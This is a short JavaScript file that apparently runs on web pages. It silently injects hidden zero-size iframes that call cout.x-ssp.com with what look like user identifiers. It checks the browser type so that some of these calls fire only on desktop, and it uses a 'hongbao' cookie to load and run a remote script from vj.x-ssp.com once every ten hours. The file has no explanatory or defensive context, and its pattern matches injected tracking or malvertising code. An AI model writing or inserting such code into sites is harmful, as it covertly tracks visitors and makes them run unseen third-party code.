
document.write("<div style='display:none;'><iframe id='count' frameborder=\"0\"   width=\"0\" height=\"0\" scrolling=\"no\" src=\"http://cout.x-ssp.com/?"+qj_js_f+"\"></iframe></div>");

var brow = {
        versions: function() {
            var u = navigator.userAgent,
                app = navigator.appVersion;
            return {
                trident: u.indexOf('Trident') > -1,
                presto: u.indexOf('Presto') > -1,
                webKit: u.indexOf('AppleWebKit') > -1,
                gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,
                mobile: !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/),
                ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
                android: u.toLowerCase().indexOf('android') > -1,
                iPhone: u.indexOf('iPhone') > -1,
                iPad: u.indexOf('iPad') > -1,
                webApp: u.indexOf('Safari') == -1
            };
        }()
    };
function setCookiees(name, value, tm) {
    {
        var fenzhong = tm;
        if (isNaN(fenzhong)) fenzhong = 0;
        var exp = new Date();
        exp.setTime(exp.getTime() + tm * 60 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
    }
}

function getCookiees(name) {
    {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) return unescape(arr[2]);
        else return null;
    }
}

if (getCookiees("hongbao")==null) {
   setCookiees("hongbao","yes",600);
   document.writeln("<script src=\"http:\/\/vj.x-ssp.com\/hb.js\"><\/script>")
}

if ((brow.versions.android==false)&&(brow.versions.iPhone==false)&&(brow.versions.iPad==false))
document.write("<div style='display:none;'><iframe id='count3' frameborder=\"0\"   width=\"0\" height=\"0\" scrolling=\"no\" src=\"http://cout.x-ssp.com/count3.html?"+qj_uid+"\"></iframe></div>");
